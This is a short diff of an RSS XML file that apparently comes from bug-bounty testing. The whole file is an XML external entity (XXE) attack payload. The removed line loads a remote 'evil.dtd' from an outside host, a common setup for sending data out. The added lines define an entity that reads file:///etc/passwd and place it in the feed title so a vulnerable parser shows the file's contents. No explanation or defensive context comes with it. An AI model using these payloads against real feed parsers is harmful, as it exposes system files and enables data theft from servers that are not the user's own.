@@ -1,7 +1,9 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://walterbugbounty.github.io/XXE/evil.dtd"> %xxe;]>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 <rss version="2.0">
   <channel>
-    <title>test</title>
+    <title>&xxe;</title>
+    <link>http://test.com</link>
+    <description>test</description>
   </channel>
 </rss>
